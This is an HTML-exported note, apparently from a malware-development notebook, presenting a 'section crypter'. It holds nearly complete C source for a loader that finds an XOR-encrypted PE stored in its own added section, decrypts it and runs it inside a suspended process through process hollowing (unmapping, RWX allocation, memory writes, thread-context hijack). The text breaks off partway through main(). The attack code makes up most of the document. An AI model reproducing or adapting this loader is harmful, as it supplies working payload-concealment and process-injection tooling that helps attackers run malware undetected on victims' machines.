<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Loader -> Attach section containing PE -> Decrypt .stub -> ProcHollow</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Loader -&gt; Attach section containing PE -&gt; Decrypt .stub -&gt; ProcHollow</h1></strong><br /><br />Just as the title sounds.<br />A builder encrypts the PE and attaches it as a section to a loader.<br />The loader then finds the section, decrypts the PE, and executes it via Process Hollowing the PE into another process.<br /><br /><a href=""><img src="images/1874-1.png" alt="images/1874-1.png" /></a><br /><br /><br /><strong><h2>## Demo</h2></strong><br /><a href=""><img src="images/1874-2.png" alt="images/1874-2.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br />The code is pretty well commented. <br />Hopefully it&#39;s easily understood.<br /><br /><strong><h3>### Loader</h3></strong><br /><div class="codebox"><div class="codebox">/*<br />&#39;Base&#39;&nbsp;because&nbsp;it&#39;s&nbsp;designed&nbsp;to&nbsp;have&nbsp;an&nbsp;encrypted&nbsp;section&nbsp;added&nbsp;to&nbsp;it&nbsp;by&nbsp;&#39;builder.exe&#39;.<br />Finds&nbsp;the&nbsp;added&nbsp;encrypted&nbsp;section&nbsp;by&nbsp;name,&nbsp;decrypts&nbsp;the&nbsp;PE,&nbsp;and&nbsp;executes&nbsp;it&nbsp;via&nbsp;process&nbsp;hollowing.<br />Only&nbsp;executes&nbsp;PE&nbsp;files&nbsp;<br />(shellcode&nbsp;not&nbsp;supported&nbsp;because&nbsp;of&nbsp;process&nbsp;hollowing&nbsp;used.<br />To&nbsp;execute&nbsp;shellcode,&nbsp;could&nbsp;execute&nbsp;it&nbsp;inside&nbsp;of&nbsp;this&nbsp;program&nbsp;without&nbsp;needing&nbsp;to&nbsp;prochollow/relocate&nbsp;etc.)<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winternl.h&gt;<br /><br />#define&nbsp;SECTION_NAME&nbsp;&quot;.tie&quot;<br /><br />typedef&nbsp;struct&nbsp;BASE_RELOCATION_ENTRY<br />{<br />	USHORT&nbsp;Offset&nbsp;:&nbsp;12;<br />	USHORT&nbsp;Type&nbsp;:&nbsp;4;<br />}&nbsp;BASE_RELOCATION_ENTRY,&nbsp;*&nbsp;PBASE_RELOCATION_ENTRY;<br /><br />typedef&nbsp;NTSTATUS(__stdcall*&nbsp;t_NtUnmapViewOfSection)(HANDLE&nbsp;Processhandle,&nbsp;PVOID&nbsp;BaseAddress);<br />t_NtUnmapViewOfSection&nbsp;d_NtUnmapViewOfSection;<br /><br />/*<br />Find&nbsp;a&nbsp;section&nbsp;by&nbsp;name.<br />Return&nbsp;its&nbsp;address&nbsp;and&nbsp;size.<br />*/<br />void*&nbsp;FindSectionByName(void*&nbsp;pe_base,&nbsp;char*&nbsp;section_name,&nbsp;DWORD*&nbsp;section_size)<br />{<br />	void*&nbsp;section_addr&nbsp;=&nbsp;NULL;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_base;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe_base&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	printf(&quot;[*]&nbsp;searching&nbsp;for&nbsp;%s&nbsp;section&nbsp;\n&quot;,&nbsp;section_name);<br />	<br />	//&nbsp;Loop&nbsp;through&nbsp;sections&nbsp;until&nbsp;the&nbsp;desired&nbsp;section&nbsp;-&gt;&nbsp;save&nbsp;its&nbsp;address&nbsp;&amp;&nbsp;size&nbsp;and&nbsp;exit<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		printf(&quot;\t&nbsp;%s&nbsp;\n&quot;,&nbsp;section_header-&gt;Name);<br />		if&nbsp;(strcmp(section_header-&gt;Name,&nbsp;section_name)&nbsp;==&nbsp;0)<br />		{<br />			section_addr&nbsp;=&nbsp;(void*)((size_t)pe_base&nbsp;+&nbsp;section_header-&gt;VirtualAddress);<br />			*section_size&nbsp;=&nbsp;section_header-&gt;Misc.VirtualSize;<br />			printf(&quot;\t&nbsp;found&nbsp;%s&nbsp;@&nbsp;0x%p&nbsp;(size:&nbsp;%d)&nbsp;\n&quot;,&nbsp;section_name,&nbsp;section_addr,&nbsp;section_header-&gt;Misc.VirtualSize);<br />			break;<br />		}<br /><br />		section_header++;<br />	}<br /><br />	return&nbsp;section_addr;<br />}<br /><br />/*<br />Null&nbsp;preserving&nbsp;XOR&nbsp;function&nbsp;to&nbsp;encrypt/decrypt&nbsp;data.<br />*/<br />void&nbsp;xor_data(unsigned&nbsp;char*&nbsp;data,&nbsp;int&nbsp;data_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;t&#39;,&nbsp;&#39;i&#39;,&nbsp;&#39;e&#39;&nbsp;};<br />	int&nbsp;key_len&nbsp;=&nbsp;sizeof(key);<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;data_size;&nbsp;i++)<br />	{<br />		if&nbsp;((data[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(data[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;key_len]))<br />			continue;<br />		else<br />			data[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;key_len];<br />	}<br /><br />	return;<br />}<br /><br />/*<br />Convert&nbsp;VirtualAddress&nbsp;(address&nbsp;in&nbsp;memory)&nbsp;to&nbsp;raw&nbsp;address&nbsp;(address&nbsp;on&nbsp;disk).<br />Does&nbsp;so&nbsp;by&nbsp;finding&nbsp;which&nbsp;PE&nbsp;section&nbsp;your&nbsp;VirtualAddress&nbsp;is&nbsp;in,<br />subtracting&nbsp;the&nbsp;section&#39;s&nbsp;start&nbsp;address&nbsp;to&nbsp;find&nbsp;the&nbsp;relative&nbsp;virtual&nbsp;address,<br />and&nbsp;then&nbsp;adding&nbsp;the&nbsp;RVA&nbsp;to&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;section&nbsp;on&nbsp;disk.<br />*/<br />DWORD&nbsp;va2raw(LPVOID&nbsp;file_buffer,&nbsp;DWORD&nbsp;va)<br />{<br />	DWORD&nbsp;rva&nbsp;=&nbsp;0;<br />	DWORD&nbsp;raw_address&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)file_buffer;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)file_buffer&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	if&nbsp;(va&nbsp;&lt;&nbsp;section_header-&gt;PointerToRawData)<br />		return&nbsp;va;<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		DWORD&nbsp;section_start&nbsp;=&nbsp;section_header-&gt;VirtualAddress;<br />		DWORD&nbsp;section_end&nbsp;=&nbsp;section_header-&gt;VirtualAddress&nbsp;+&nbsp;section_header-&gt;SizeOfRawData;<br /><br />		//&nbsp;If&nbsp;the&nbsp;provided&nbsp;VA&nbsp;is&nbsp;within&nbsp;the&nbsp;bounds&nbsp;of&nbsp;this&nbsp;current&nbsp;section<br />		if&nbsp;(va&nbsp;&gt;=&nbsp;section_start&nbsp;&amp;&amp;&nbsp;va&nbsp;&lt;&nbsp;section_end)<br />		{<br />			rva&nbsp;=&nbsp;va&nbsp;-&nbsp;section_start;<br />			raw_address&nbsp;=&nbsp;section_header-&gt;PointerToRawData&nbsp;+&nbsp;rva;<br />			break;<br />		}<br /><br />		section_header&nbsp;+=&nbsp;1;<br />	}<br /><br />	return&nbsp;raw_address;<br />}<br /><br />/*<br />Get&nbsp;the&nbsp;base&nbsp;address&nbsp;of&nbsp;a&nbsp;remote&nbsp;process.<br />Doesn&#39;t&nbsp;use&nbsp;undocumented&nbsp;structs&nbsp;&amp;&nbsp;functions.<br /><br />Return:<br />	On&nbsp;success,&nbsp;returns&nbsp;image&nbsp;base&nbsp;of&nbsp;target.<br />	On&nbsp;failure,&nbsp;returns&nbsp;NULL.<br />*/<br />void*&nbsp;GetRemoteBaseAddress(HANDLE&nbsp;h_process,&nbsp;HANDLE&nbsp;h_thread)<br />{<br />	BOOL&nbsp;b_ret;<br />	void*&nbsp;image_base_location&nbsp;=&nbsp;NULL;<br />	void*&nbsp;image_base_address&nbsp;=&nbsp;NULL;<br />	CONTEXT&nbsp;remote_ctx&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	remote_ctx.ContextFlags&nbsp;=&nbsp;CONTEXT_FULL;<br /><br />	//&nbsp;get&nbsp;thread&nbsp;info&nbsp;about&nbsp;remote&nbsp;process<br />	b_ret&nbsp;=&nbsp;GetThreadContext(h_thread,&nbsp;&amp;remote_ctx);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br /><br />	//&nbsp;read&nbsp;base&nbsp;address&nbsp;from&nbsp;registers<br />#ifdef&nbsp;_WIN64<br />	image_base_location&nbsp;=&nbsp;(void*)(remote_ctx.Rdx&nbsp;+&nbsp;16);<br />	b_ret&nbsp;=&nbsp;ReadProcessMemory(h_process,&nbsp;image_base_location,&nbsp;&amp;image_base_address,&nbsp;8,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br />#else<br />	image_base_location&nbsp;=&nbsp;(void*)(remote_ctx.Ebx&nbsp;+&nbsp;8);<br />	b_ret&nbsp;=&nbsp;ReadProcessMemory(h_process,&nbsp;image_base_location,&nbsp;&amp;image_base_address,&nbsp;4,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		return&nbsp;NULL;<br />#endif<br /><br />	return&nbsp;image_base_address;<br />}<br /><br />/*<br />Loop&nbsp;through&nbsp;relocation&nbsp;table&nbsp;and&nbsp;perform&nbsp;base&nbsp;relocations.<br />Uses&nbsp;raw&nbsp;addresses!<br />`if`&nbsp;statements&nbsp;are&nbsp;used&nbsp;to&nbsp;make&nbsp;the&nbsp;code&nbsp;position&nbsp;independent<br />(using&nbsp;a&nbsp;switch&nbsp;statement&nbsp;assembles&nbsp;to&nbsp;jmp&nbsp;instructions,&nbsp;which<br />prevents&nbsp;the&nbsp;code&nbsp;from&nbsp;being&nbsp;position&nbsp;independent)<br />*/<br />BOOL&nbsp;RelocatePE(void*&nbsp;pe_buf,&nbsp;void*&nbsp;new_base)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br /><br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_buf;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((SIZE_T)dos_header&nbsp;+&nbsp;(SIZE_T)dos_header-&gt;e_lfanew);<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_table&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((size_t)pe_buf&nbsp;+&nbsp;va2raw(pe_buf,&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_block&nbsp;=&nbsp;reloc_table;<br />	DWORD&nbsp;table_size&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br /><br />	size_t&nbsp;delta&nbsp;=&nbsp;(size_t)new_base&nbsp;-&nbsp;(size_t)pe_header-&gt;OptionalHeader.ImageBase;<br />	if&nbsp;(delta&nbsp;==&nbsp;0)<br />		return&nbsp;ok;<br /><br />	printf(&quot;\t\t&nbsp;original&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(void*)pe_header-&gt;OptionalHeader.ImageBase);<br />	printf(&quot;\t\t&nbsp;target&nbsp;base:&nbsp;&nbsp;&nbsp;0x%p&nbsp;\n&quot;,&nbsp;new_base);<br />	printf(&quot;\t\t&nbsp;delta:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(void*)delta);<br /><br />	DWORD&nbsp;entries_in_block&nbsp;=&nbsp;0;<br />	DWORD&nbsp;table_position&nbsp;=&nbsp;0;<br />	PBASE_RELOCATION_ENTRY&nbsp;reloc_entry&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;Loop&nbsp;through&nbsp;blocks&nbsp;in&nbsp;relocation&nbsp;table<br />	while&nbsp;(table_position&nbsp;&lt;&nbsp;table_size)<br />	{<br />		entries_in_block&nbsp;=&nbsp;(reloc_block-&gt;SizeOfBlock&nbsp;-&nbsp;sizeof(IMAGE_BASE_RELOCATION))&nbsp;/&nbsp;sizeof(WORD);<br />		reloc_entry&nbsp;=&nbsp;(PBASE_RELOCATION_ENTRY)(reloc_block&nbsp;+&nbsp;1);<br /><br />		for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;entries_in_block;&nbsp;i++)<br />		{<br />			void*&nbsp;reloc_addr&nbsp;=&nbsp;(void*)((size_t)pe_buf&nbsp;+&nbsp;va2raw(pe_buf,&nbsp;reloc_block-&gt;VirtualAddress)&nbsp;+&nbsp;reloc_entry-&gt;Offset);<br /><br />			if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_HIGH)<br />				*(WORD*)((size_t)reloc_addr&nbsp;+&nbsp;0x2)&nbsp;+=&nbsp;HIWORD(delta);	//&nbsp;add&nbsp;higher&nbsp;16&nbsp;bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;higher&nbsp;16&nbsp;bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_LOW)<br />				*(WORD*)reloc_addr&nbsp;+=&nbsp;LOWORD(delta);					//&nbsp;add&nbsp;lower&nbsp;16&nbsp;bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;lower&nbsp;16&nbsp;bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_HIGHLOW)<br />				*(DWORD*)reloc_addr&nbsp;+=&nbsp;delta;							//&nbsp;add&nbsp;all&nbsp;32bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;the&nbsp;32bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_DIR64)<br />				*(DWORD64*)reloc_addr&nbsp;+=&nbsp;delta;							//&nbsp;add&nbsp;all&nbsp;64bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;the&nbsp;64bits&nbsp;at&nbsp;relocation&nbsp;address<br /><br />			reloc_entry&nbsp;+=&nbsp;1;<br />		}<br /><br />		//&nbsp;Advance&nbsp;to&nbsp;next&nbsp;block<br />		table_position&nbsp;+=&nbsp;reloc_block-&gt;SizeOfBlock;<br />		reloc_block&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((size_t)reloc_block&nbsp;+&nbsp;reloc_block-&gt;SizeOfBlock);<br />	}<br /><br />	printf(&quot;\t\t&nbsp;done!&nbsp;\n&quot;);<br />	return&nbsp;ok;<br />}<br /><br />BOOL&nbsp;ProcessHollow(void*&nbsp;pe,&nbsp;char*&nbsp;target_name)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;b&nbsp;=&nbsp;TRUE;<br />	NTSTATUS&nbsp;nt_status&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;NULL;<br />	STARTUPINFOA&nbsp;target_si&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	PROCESS_INFORMATION&nbsp;target_pi&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	CONTEXT&nbsp;target_ctx&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	target_ctx.ContextFlags&nbsp;=&nbsp;CONTEXT_FULL;<br />	void*&nbsp;source_base&nbsp;=&nbsp;(void*)pe_header-&gt;OptionalHeader.ImageBase;<br />	void*&nbsp;target_base&nbsp;=&nbsp;NULL;<br />	<br />	printf(&quot;\t[*]&nbsp;PE&nbsp;to&nbsp;inject:&nbsp;\n&quot;);<br />	printf(&quot;\t\t&nbsp;buffer&nbsp;loaded&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;pe);<br />	printf(&quot;\t\t&nbsp;image&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;source_base);<br />	printf(&quot;\t\t&nbsp;entry&nbsp;point:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(void*)pe_header-&gt;OptionalHeader.AddressOfEntryPoint);<br /><br />	//&nbsp;Create&nbsp;a&nbsp;suspended&nbsp;target&nbsp;process&nbsp;and&nbsp;grab&nbsp;its&nbsp;base&nbsp;address<br />	printf(&quot;\t[*]&nbsp;target&nbsp;process:&nbsp;\n&quot;);<br />	b&nbsp;=&nbsp;CreateProcessA(NULL,&nbsp;target_name,&nbsp;NULL,&nbsp;NULL,&nbsp;FALSE,&nbsp;CREATE_SUSPENDED,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;target_si,&nbsp;&amp;target_pi);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;suspended&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	<br />	target_base&nbsp;=&nbsp;GetRemoteBaseAddress(target_pi.hProcess,&nbsp;target_pi.hThread);<br />	if&nbsp;(target_base&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;get&nbsp;base&nbsp;address&nbsp;of&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	<br />	printf(&quot;\t\t&nbsp;\&quot;%s\&quot;&nbsp;\n&quot;,&nbsp;target_name);<br />	printf(&quot;\t\t&nbsp;image&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	/*<br />	Relocate&nbsp;PE&nbsp;to&nbsp;new&nbsp;base,&nbsp;<br />	fix&nbsp;imports&nbsp;by&nbsp;changing&nbsp;source&nbsp;base&nbsp;to&nbsp;target&nbsp;process&nbsp;base,<br />	and&nbsp;match&nbsp;PE&nbsp;subsystem&nbsp;(get&nbsp;a&nbsp;0xc0000142&nbsp;if&nbsp;subsystems&nbsp;don&#39;t&nbsp;match)<br /><br />	NOTE:<br />	I&nbsp;can&nbsp;comment&nbsp;out&nbsp;both&nbsp;relocating&nbsp;the&nbsp;PE&nbsp;and&nbsp;changing&nbsp;the&nbsp;source&nbsp;base,&nbsp;<br />	and&nbsp;the&nbsp;code&nbsp;will&nbsp;still&nbsp;work.<br />	I&nbsp;have&nbsp;no&nbsp;idea&nbsp;why.&nbsp;Implies&nbsp;my&nbsp;image&nbsp;rebasing&nbsp;is&nbsp;wrong?&nbsp;(but&nbsp;I&nbsp;don&#39;t&nbsp;think&nbsp;it&nbsp;is)<br />	*/<br />	printf(&quot;\t&nbsp;[*]&nbsp;relocating&nbsp;PE&nbsp;\n&quot;);<br />	RelocatePE(pe,&nbsp;target_base);<br />	pe_header-&gt;OptionalHeader.ImageBase&nbsp;=&nbsp;(size_t)target_base;<br />	pe_header-&gt;OptionalHeader.Subsystem&nbsp;=&nbsp;IMAGE_SUBSYSTEM_WINDOWS_GUI;<br /><br />	//&nbsp;Hollow&nbsp;out&nbsp;target<br />	printf(&quot;\t[*]&nbsp;hollowing&nbsp;target&nbsp;\n&quot;);<br /><br />	d_NtUnmapViewOfSection&nbsp;=&nbsp;(t_NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;Ntdll.dll&quot;),&nbsp;&quot;NtUnmapViewOfSection&quot;);<br />	nt_status&nbsp;=&nbsp;d_NtUnmapViewOfSection(target_pi.hProcess,&nbsp;target_base);<br />	if&nbsp;(!NT_SUCCESS(nt_status))<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;get&nbsp;hollow&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t\t&nbsp;unmapped&nbsp;target&nbsp;from:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	/*<br />	Allocate&nbsp;memory&nbsp;in&nbsp;target,<br />	write&nbsp;PE&nbsp;headers,&nbsp;<br />	and&nbsp;write&nbsp;PE&nbsp;sections&nbsp;1&nbsp;by&nbsp;1&nbsp;to&nbsp;memory&nbsp;map&nbsp;them.<br />	*/<br />	target_base&nbsp;=&nbsp;VirtualAllocEx(target_pi.hProcess,&nbsp;target_base,&nbsp;pe_header-&gt;OptionalHeader.SizeOfImage,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />	if&nbsp;(target_base&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t\t&nbsp;allocated&nbsp;RWX&nbsp;memory&nbsp;in&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	b&nbsp;=&nbsp;WriteProcessMemory(target_pi.hProcess,&nbsp;target_base,&nbsp;pe,&nbsp;pe_header-&gt;OptionalHeader.SizeOfHeaders,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;PE&nbsp;headers&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t\t&nbsp;wrote&nbsp;PE&nbsp;headers&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_base);<br /><br />	printf(&quot;\t\t&nbsp;sections:&nbsp;\n&quot;);<br />	section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br />	LPVOID&nbsp;section_address&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;write_address&nbsp;=&nbsp;NULL;<br />	for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		section_address&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)pe&nbsp;+&nbsp;section_header-&gt;PointerToRawData);<br />		write_address&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)target_base&nbsp;+&nbsp;section_header-&gt;VirtualAddress);<br /><br />		b&nbsp;=&nbsp;WriteProcessMemory(target_pi.hProcess,&nbsp;write_address,&nbsp;section_address,&nbsp;section_header-&gt;SizeOfRawData,&nbsp;0);<br />		if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />		{<br />			printf(&quot;\t\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;%s&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;section_header-&gt;Name,&nbsp;write_address);<br />			ok&nbsp;=&nbsp;FALSE;<br />			goto&nbsp;cleanup;<br />		}<br />		printf(&quot;\t\t\t&nbsp;wrote&nbsp;%s&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;section_header-&gt;Name,&nbsp;write_address);<br /><br />		section_header&nbsp;+=&nbsp;1;<br />	}<br /><br />	//&nbsp;Grab&nbsp;registers&nbsp;from&nbsp;target&nbsp;process<br />	/*<br />	Grab&nbsp;registers&nbsp;from&nbsp;target&nbsp;process,<br />	copy&nbsp;our&nbsp;injected&nbsp;PE&#39;s&nbsp;entry&nbsp;point&nbsp;into&nbsp;the&nbsp;target&nbsp;process&#39;s&nbsp;register,<br />	-&nbsp;for&nbsp;32bit,&nbsp;the&nbsp;entry&nbsp;point&nbsp;is&nbsp;copied&nbsp;into&nbsp;EAX<br />	-&nbsp;for&nbsp;64bit,&nbsp;it&nbsp;goes&nbsp;in&nbsp;RCX<br />	and&nbsp;execute&nbsp;our&nbsp;injected&nbsp;PE&nbsp;by&nbsp;resuming&nbsp;the&nbsp;target&nbsp;process.<br />	*/<br />	b&nbsp;=&nbsp;GetThreadContext(target_pi.hThread,&nbsp;&amp;target_ctx);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;grab&nbsp;registers&nbsp;of&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />#ifdef&nbsp;_WIN64<br />	target_ctx.Rcx&nbsp;=&nbsp;(size_t)target_base&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint;<br />	printf(&quot;\t[*]&nbsp;copied&nbsp;source&nbsp;entry&nbsp;point&nbsp;into&nbsp;RCX:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)target_ctx.Rcx);<br />#else<br />	target_ctx.Eax&nbsp;=&nbsp;(size_t)target_base&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint;<br />	printf(&quot;\t[*]&nbsp;copied&nbsp;source&nbsp;entry&nbsp;point&nbsp;into&nbsp;EAX:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)target_ctx.Eax);<br />#endif<br /><br />	printf(&quot;\t[*]&nbsp;resuming&nbsp;execution...&nbsp;\n&quot;);<br />	SetThreadContext(target_pi.hThread,&nbsp;&amp;target_ctx);<br />	ResumeThread(target_pi.hThread);<br /><br />cleanup:<br />	CloseHandle(target_pi.hProcess);<br />	CloseHandle(target_pi.hThread);<br />	printf(&quot;\t[*]&nbsp;done!&nbsp;\n&quot;);<br /><br />	return&nbsp;ok;<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br />	void*&nbsp;pe&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;pe_size&nbsp;=&nbsp;0;<br /><br />	printf(&quot;#&nbsp;SECTION&nbsp;CRYPTER&nbsp;-&nbsp;loader\n&quot;);<br />	printf(&quot;Imma&nbsp;extract&nbsp;your&nbsp;encrypted&nbsp;PE&nbsp;and&nbsp;execute&nbsp;it&nbsp;for&nbsp;you,&nbsp;gimme&nbsp;a&nbsp;sec&nbsp;would&nbsp;ya?&nbsp;\n\n&quot;);<br />	<br />	pe&nbsp;=&nbsp;FindSectionByName(GetModuleHandleA(NULL),&nbsp;SECTION_NAME,&nbsp;&amp;pe_size);<br />	if&nbsp;(pe&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;find&nbsp;the&nbsp;%s&nbsp;section&nbsp;\n\tthis&nbsp;could&nbsp;be&nbsp;just&nbsp;the&nbsp;base&nbsp;file.&nbsp;\n\thave&nbsp;you&nbsp;built&nbsp;a&nbsp;crypted&nbsp;binary&nbsp;yet?&nbsp;\n&quot;,&nbsp;SECTION_NAME);<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;Mark&nbsp;memory&nbsp;as&nbsp;r/w/x&nbsp;and&nbsp;decrypt&nbsp;data.<br />	DWORD&nbsp;old_protect&nbsp;=&nbsp;0;<br />	b&nbsp;=&nbsp;VirtualProtect(pe,&nbsp;pe_size,&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;&amp;old_protect);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		